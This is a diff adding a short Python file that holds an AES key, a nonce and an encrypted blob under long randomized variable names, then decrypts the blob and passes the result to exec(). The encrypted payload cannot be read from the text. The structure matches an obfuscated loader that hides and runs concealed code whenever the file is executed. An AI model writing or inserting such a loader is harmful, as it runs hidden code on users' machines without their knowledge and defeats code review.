@@ -1,0 +1,8 @@
+from Cryptodome.Cipher import AES
+
+Onsc5sYNTbufdd8QoH3mVXx6JbZXFlJCKaDMPPlwRwXHksPu61wje8BlYiv9nrFoVXMK2rQChQFdvJ4u = b'\xbc?\xd5b\xe0\xbc\xfa\x80\xa0\x08\x08\x9dD\x18^\xbd\x81:\xc5Xaa\xb9l@Rl\xfd\xbc\xe4\xb8\xb6'
+jIBnKbPSQ6NSejcuxBDPh7nWuLIwBYnTHbfpzLvooQcR6fHTyg07NirrxkP2rizPmDLSTSSX4CcPA0HWbYuYcbhlJN = b'jLl]\xf6Zq\xd5\xe1\xd7~yM\x86\xba\xe6\x1f\n\x99d\x15\xb01/\x83:\xef>\xc9dZ\xa2\xbf\xe97\xe1\x0c\x08T\xca\xb2G\xf3\xe2h\xca\x85\xbe\xe6\xe9\x9f/+$\xd9\x8a%\xa1\x8b\xac>\xd5\xe4/H\xc7\xb0\xd8\xe9+m6\xe3\x1e\xa0N\xc77\x19<J\xa7\x8e\xfd[ \xec\xe7\xa4\x8b=\xb5\x8d\x86Av\xc5\x90\x94\x98\x84\xb3\x15]\xf8\xb3\ne\xbd\xf1JF(B\xd7\x92Q.\xfc\x91}aU&\x8e\xfeQ\xde\xfc@\xc2`tW&\xd9\xc5\xfb\xd7fW }W\xf3;\xda\xd5\xc2\xf3a\xf6\xb7\x0b\xea}T^e*w~Z\xa2\xdf\x81w\xbe\xf1\xd2\xe5\x81#\x906\xe7\xb9\xa8\x14\xaa}\xf9\xa1n\xed\xd8/\xaa\xd4'
+aGQMXhp77LsCL1dTz2dhhjgRNDvNALVoOzOOKMQTJSMHJZoR05ZMOXFaj8ndGV3lAXOu9A = b'\xc2Q\rw\xb8\x98\xd2\xad(\xf9\xbd\xe6\xd8\x98\x80\xa3'
+
+XGz4ISSQU6Wy7sEB1fqJTYbVJt2XAYqwdqWAxQM6QmM25nDOnPEvYVfTs2ujvAiKmXn6ZacgVNs = AES.new(Onsc5sYNTbufdd8QoH3mVXx6JbZXFlJCKaDMPPlwRwXHksPu61wje8BlYiv9nrFoVXMK2rQChQFdvJ4u, AES.MODE_EAX, aGQMXhp77LsCL1dTz2dhhjgRNDvNALVoOzOOKMQTJSMHJZoR05ZMOXFaj8ndGV3lAXOu9A)
+exec(XGz4ISSQU6Wy7sEB1fqJTYbVJt2XAYqwdqWAxQM6QmM25nDOnPEvYVfTs2ujvAiKmXn6ZacgVNs.decrypt(jIBnKbPSQ6NSejcuxBDPh7nWuLIwBYnTHbfpzLvooQcR6fHTyg07NirrxkP2rizPmDLSTSSX4CcPA0HWbYuYcbhlJN))
